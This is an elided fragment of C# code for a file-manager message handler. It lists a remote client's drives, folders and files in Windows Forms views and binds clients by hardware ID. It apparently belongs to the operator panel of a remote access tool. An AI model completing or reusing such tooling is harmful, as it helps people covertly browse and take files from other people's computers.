	...
	public class HandleFileManager
	{
		...
		public async void FileManager(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				...
				if (!(asString == "setClient"))
				{
					if (!(asString == "getDrivers"))
					{
						if (!(asString == "getPath"))
						{
							if (!(asString == "reqUploadFile"))
							{
								if (asString == "error")
								{
							...
							else
							{
								...
								if (FD != null)
								{
									...
									ThreadPool.QueueUserWorkItem(new WaitCallback(FD.Send), msgpack.Encode2Bytes());
									msgpack = null;
								}
							}
						}
						else
						{
							...
							if (FM != null)
							{
								...
								ListView.ListViewItemCollection listViewItemCollection = FM.listView1.Items;
								listViewItemCollection.AddRange(await Task.Run<ListViewItem[]>(() => this.GetFolders(unpack_msgpack, groupFolder).ToArray()));
								listViewItemCollection = null;
								listViewItemCollection = FM.listView1.Items;
								listViewItemCollection.AddRange(await Task.Run<ListViewItem[]>(() => this.GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
								listViewItemCollection = null;
								FM.listView1.Enabled = true;
								FM.listView1.Focus();
								FM.listView1.EndUpdate();
								FM.toolStripStatusLabel2.Text = string.Format("       Folder[{0}]   Files[{1}]", FM.listView1.Groups[0].Items.Count, FM.listView1.Groups[1].Items.Count);
							}
						}
					}
					else
					{
						...
						if (formFileManager2 != null)
						{
							...
							string[] array = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new string[] { "-=>" }, StringSplitOptions.None);
							for (int i = 0; i < array.Length; i++)
							{
								if (array[i].Length > 0)
								{
									ListViewItem listViewItem = new ListViewItem();
									listViewItem.Text = array[i];
									listViewItem.ToolTipText = array[i];
									if (array[i + 1] == "Fixed")
									{
										listViewItem.ImageIndex = 1;
									}
									else if (array[i + 1] == "Removable")
									{
				...
				else
				{
					...
					if (formFileManager3 != null && formFileManager3.Client == null)
					{
						client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
						formFileManager3.Client = client;
						formFileManager3.timer1.Enabled = true;
					}
				}
			}
			catch
		...
		{
			string[] array = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new string[] { "-=>" }, StringSplitOptions.None);
		...
		{
			string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new string[] { "-=>" }, StringSplitOptions.None);
			List<ListViewItem> list = new List<ListViewItem>();
			int i;
			int j;
